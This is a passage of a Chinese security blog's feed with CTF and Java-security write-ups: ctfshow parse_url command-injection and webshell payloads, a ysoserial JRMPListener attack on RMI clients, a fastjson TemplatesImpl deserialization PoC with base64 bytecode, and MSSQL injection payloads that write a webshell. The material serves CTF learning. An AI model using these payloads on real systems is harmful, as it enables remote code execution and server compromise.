h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>还是先本地构造来进行尝试</p><p><img src="../images/image-20230516144313226.png" alt="image-20230516144313226"></p><p>这里发现成功后，这里不能用<code>/</code>的原因是因为会被识别成path</p><p><img src="../images/image-20230516144743961.png" alt="image-20230516144743961"></p><p>这里的话使用<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也行</p><p><img src="../images/image-20230516145016184.png" alt="image-20230516145016184"></p><p>不过这里的话要在这个<code>$&#123;PWD::1&#125;</code>的后面加上一个<code>:</code>,不然不会执行成功</p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure><p>这里话<code>extract</code>，考察的是个变量覆盖的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果-------------------------------------------------------------------</span><br><span class="line"><span class="variable">$a</span> = Cat; <span class="variable">$b</span> = Dog; <span class="variable">$c</span> = Horse</span><br></pre></td></tr></table></figure><p>这就是这个函数的用法</p><p>就是把数组里的<code>key</code>作为变量名，把数组里的<code>value</code>作为变量的值</p><p>就是一个套娃的过程</p><p><img src="../images/image-20230516152003470.png" alt="image-20230516152003470"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span>=scheme</span><br><span class="line"><span class="variable">$$host</span>=<span class="variable">$scheme</span>=user</span><br><span class="line"><span class="variable">$$$host</span>=<span class="variable">$user</span>=pass</span><br><span class="line"><span class="variable">$$$$host</span>=<span class="variable">$pass</span>=fragment</span><br><span class="line"><span class="variable">$$$$$host</span>=<span class="variable">$fragment</span>=query</span><br><span class="line"><span class="variable">$$$$$$host</span>=<span class="variable">$query</span>=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure><p>这里的话传入参数的时候要会<code>#</code>进行url编码</p><p><img src="../images/image-20230516152215558.png" alt="image-20230516152215558"></p><p><img src="../images/image-20230516152318971.png" alt="image-20230516152318971"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的话直接写php代码到文件里是不行的，因为存在的<code>?</code>会被识别成<code>query</code></p><p>我们就是用html文件中的&lt; script language=‘php’&gt;标签来实现php的代码。这里记住，只需写一个&lt; script&gt;，不需要写&lt; /scirpt&gt;，因为/还会被parse_url函数当作path中的内容。</p><p><img src="../images/image-20230516153311944.png" alt="image-20230516153311944"></p><p><img src="../images/image-20230516153607169.png" alt="image-20230516153607169"></p><p>最终paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http:<span class="comment">//&lt;script+language=&quot;php&quot;&gt;system(&#x27;cd+..;cd+..;cd+..;cat+_f1a_g_1s_h3re&#x27;);:/var/www/html/1.php</span></span><br></pre></td></tr></table></figure><p>这里的话用之前的<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也是可以的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe&quot;&gt;官方wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;看了wp之后，学到了一个新技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在&lt;code&gt;/&lt;</summary>
      
    
    
    
    
    <category term="ctfshow-周末大挑战-parse_url" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98-parse-url/"/>
    
  </entry>
  
  <entry>
    <title>java-RMI恶意服务</title>
    <link href="https://ke1nys.github.io/posts/7aace6cb.html"/>
    <id>https://ke1nys.github.io/posts/7aace6cb.html</id>
    <published>2023-05-14T08:03:03.000Z</published>
    <updated>2023-05-14T13:57:44.832Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频</a></p><p><a href="https://xz.aliyun.com/t/9053#toc-1">参考文章</a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java RMI机制能够让一台Java虚拟机上的对象调用运行在另一台Java虚拟机上的对象的方法。总结一下，RMI机制的实现依赖于以下三个部分</p><ul><li>RMI Server</li><li>RMI Registry</li><li>RMI Client</li></ul><p>简单概括一下RMI的流程：Server端事先在Registry处<code>bind</code>将要被调用的远程对象。当Client需要调用远程对象时，先根据<code>rmi://</code>地址连接到Registry，然后在Registry处查看是否绑定有需要的远程对象。如果有，则Registry返回Server端的<code>rmi://</code>地址以及开放的端口，Client据此连接到Server。然后才开始真正的远程方法调用，远程方法在Server端执行，Server将执行后的结果发送给Client。</p><h3 id="RMI的恶意利用"><a href="#RMI的恶意利用" class="headerlink" title="RMI的恶意利用"></a>RMI的恶意利用</h3><p>先创建两个项目</p><p><strong>RMIServer</strong></p><p><strong>RMIClient</strong></p><p>这两个项目都要有相同的接口</p><p><img src="../images/image-20230514164640177.png" alt="image-20230514164640177"></p><p><img src="../images/image-20230514164725676.png" alt="image-20230514164725676"></p><p>先创建两个项目，<strong>分别是客户端和服务端(然后有相同的接口)</strong></p><p><img src="../images/image-20230514164826518.png" alt="image-20230514164826518"></p><p>服务端已经开了个端口出去了，客户端就可以直接去进行访问</p><p>但是客户端并不知道开的端口是啥，这里就得通过这个注册中心开的端口来找</p><p>默认的是1099，然后又因为注册中心于服务端开放的端口绑定了，于是就可以通过注册中心来查到服务端开放的端口</p><p><img src="../images/image-20230514165804204.png" alt="image-20230514165804204"></p><p>这里的话是获取注册中心的端口，然后获取绑定的名字，然后在进行函数的调用</p><p><img src="../images/image-20230514165918336.png" alt="image-20230514165918336"></p><p>成功在服务端回显 这里调用的是服务端的sayHello()方法</p><p>这里客户端没写回显，所以没输出</p><p>上面就是简单的RMI的执行过程了</p><h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><h5 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h5><p>此方法可以攻击客户端和服务端</p><p>对于注册中心来说，我们还是从这几个方法触发：</p><ul><li>bind</li><li>unbind</li><li>rebind</li><li>list</li><li>lookup</li></ul><p>除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这里的意思是开启一个恶意的RMI服务端</p><p><img src="../images/image-20230514180701300.png" alt="image-20230514180701300"></p><p>成功执行，只不过本地开的话java版本太高，开不了，所以就用kali的ip,执行不了计算器</p><p>这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的</p><p><strong>剩下的去参考上面的文章就行了，因为其他的没有用到ysoserial服务端进行伪造</strong></p><h3 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h3><p><a href="https://xz.aliyun.com/t/9053#toc-9">参考文章</a></p><p>这里就不写了，因为写了也是照搬下来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298c&quot;&gt;参考视频&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="java-RMI恶意服务" scheme="https://ke1nys.github.io/tags/java-RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>java-fastjson 链子分析</title>
    <link href="https://ke1nys.github.io/posts/7ec3d05a.html"/>
    <id>https://ke1nys.github.io/posts/7ec3d05a.html</id>
    <published>2023-05-10T03:17:37.000Z</published>
    <updated>2023-05-17T08:30:57.113Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/12096#toc-3">参考文章</a></p><p>这里用的是fastjson 1.2.24版本来进行分析</p><p><img src="../images/image-20230510112535170.png" alt="image-20230510112535170"></p><p><img src="../images/image-20230510115514716.png" alt="image-20230510115514716"></p><p>给上面的图片在添加一个条件，满足条件的getter也行</p><p>这就是fastjson和<strong>原生类</strong>的反序列化的不同之处</p><h3 id="JdbcRowSetImpl链子"><a href="#JdbcRowSetImpl链子" class="headerlink" title="JdbcRowSetImpl链子"></a>JdbcRowSetImpl链子</h3><p><strong>这个链子是必须出网的</strong></p><p><code>com.sun.rowset.JdbcRowSetImpl</code>中的<code>dataSourceName</code>属性 寻找他的set方法</p><p><img src="../images/image-20230517154056485.png" alt="image-20230517154056485"></p><p>然后跟进到他的<code>setdataSourceName</code>方法</p><p><img src="../images/image-20230517154148020.png" alt="image-20230517154148020"></p><p>这里就是把传进去的值赋给<code>dataSource</code></p><p>这里再看<code>autoCommit</code>属性，然后去查看他的set方法，<code>setautocommit</code>,需要传入一个布尔类型的参数</p><p><img src="../images/image-20230517154245264.png" alt="image-20230517154245264"></p><p>判断conn是否为空 不然就赋值 跟进connect方法</p><p><img src="../images/image-20230517154459890.png" alt="image-20230517154459890"></p><p><code>lookup(getDataSourceName())</code> lookup函数链接我们写入的服务 加载我们的恶意类<br>构造恶意类</p><p>根据最后的<code>connect()</code>方法，前面的操作就讲得通了</p><p>因为前面得<code>conn</code>默认为空，所以能进入下一层，然后又因为我们给了<code>DataSourceName</code>赋值，又可以进入下一层，然后就是<code>lookup()</code>函数进行连接了，连接得值刚好是<code>DataSourceName</code></p><h3 id="TemplatesImpl-链子"><a href="#TemplatesImpl-链子" class="headerlink" title="TemplatesImpl 链子"></a>TemplatesImpl 链子</h3><p><strong>这个链子是不出网的</strong></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EvilCalss.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为字节码文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;.\\src\\main\\java\\test\\EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;编码\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发；</p><h4 id="动态加载字节码分析"><a href="#动态加载字节码分析" class="headerlink" title="动态加载字节码分析"></a>动态加载字节码分析</h4><p>这里的话在我之前写过得一篇文章也有写这个  <a href="https://ke1nys.github.io/posts/30ead299.html">Java安全之BCEL ClassLoader</a></p><p>首先分析后半部分 即<code>TemplatesImpl</code>中的链子<br>由上文我们知道 ，fastjson使用<code>JSON.parseObject</code>方法反序列化会调用get 和set方法<br>在<code>TemplatesImpl</code>中属性的get和set方法中<br><code>getOutputProperties</code>方法调用了<code>newTransformer</code>方法</p><p><img src="../images/image-20230517160245013.png" alt="image-20230517160245013"></p><p>在<code>newTransformer</code>中调用了<code>getTransletInstance</code>方法</p><p><img src="../images/image-20230517161405853.png" alt="image-20230517161405853"></p><p>这里需要调用到<code>defineTransletClasses</code>所以需要使<code>_name!=null,_class == null</code></p><p><img src="../images/image-20230517161442419.png" alt="image-20230517161442419"></p><p>在defineTransletClasses中 重写了defineClass方法 对<code>_bytecodes</code>中的恶意代码进行加载</p><p><img src="../images/image-20230517161528118.png" alt="image-20230517161528118"></p><p>这部分其实就是CC4 的后半部分</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/12096#toc-3&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里用的是fastjson 1.2.24版本来进行分析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230510112535</summary>
      
    
    
    
    
    <category term="java-fastjson 链子分析" scheme="https://ke1nys.github.io/tags/java-fastjson-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Mini-L CTF web 复现</title>
    <link href="https://ke1nys.github.io/posts/fbdb0624.html"/>
    <id>https://ke1nys.github.io/posts/fbdb0624.html</id>
    <published>2023-05-09T13:00:52.000Z</published>
    <updated>2023-05-14T08:01:08.946Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话只复现部分题</p><p><a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp地址</a></p><h2 id="ezsql-sql-server-mssql"><a href="#ezsql-sql-server-mssql" class="headerlink" title="ezsql(sql server mssql)"></a>ezsql(sql server mssql)</h2><p><img src="../images/image-20230509212213754.png" alt="image-20230509212213754"></p><p><img src="../images/image-20230509213811523.png" alt="image-20230509213811523"></p><p><strong>考查的是sqlserver</strong> <strong>也是mssql</strong></p><p>这里的话是给了查询语句  <strong>列和表都给了  id users</strong></p><p>数据库查询</p><p><img src="../images/image-20230510105038552.png" alt="image-20230510105038552"></p><p><img src="../images/image-20230510105055721.png" alt="image-20230510105055721"></p><p><strong>查出来是ctf</strong>  在sqlserver中 <strong>数据库是db_name()</strong></p><p>拿出祖传字典fuzz一下，发现过滤了<strong>空格、星号、百分号、引号</strong>以及常用的增删查改关键字（<strong>但是大小写能绕过，这个点很重要</strong>）</p><p><a href="http://www.ppmy.cn/news/9311.html">SQL Server注入技巧与提权方式详解</a></p><p><img src="../images/image-20230509214305648.png" alt="image-20230509214305648"></p><p>可以了解一下这个空格绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;ALTER%1eTABLE%1eusers�ADD�wcs�varchar(2000)�NULL;</span><br><span class="line">1;inSert�into�users(id,wcs,name)�values�(17,0x3c3f70687020706870696e666f28293b203f3e,36);</span><br><span class="line">1;declare�@wcs�varchar(2000)�set�@wcs=0x2f7661722f7777772f68746d6c2f6f6b6f6b2e706870�bacKup�log�ctf�to�disk=@wcs�with�init;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230509224513281.png" alt="image-20230509224513281"></p><p><img src="../images/image-20230509224610461.png" alt="image-20230509224610461"></p><p><a href="https://cn-sec.com/archives/1277068.html"><strong>日志备份和差异备份获取webshell</strong></a></p><p><a href="https://www.cnblogs.com/-qing-/p/10910282.html"><strong>Web渗透之mssql差异备份getshell</strong></a></p><p>这里有个小知识点就是得需要bp或则hackbar来写，输入框的话是不能解析url编码的，因为我们需要用url编码来进行空格的绕过</p><p><img src="../images/image-20230511095149341.png" alt="image-20230511095149341"></p><h2 id="minijava-RMI反序列化漏洞"><a 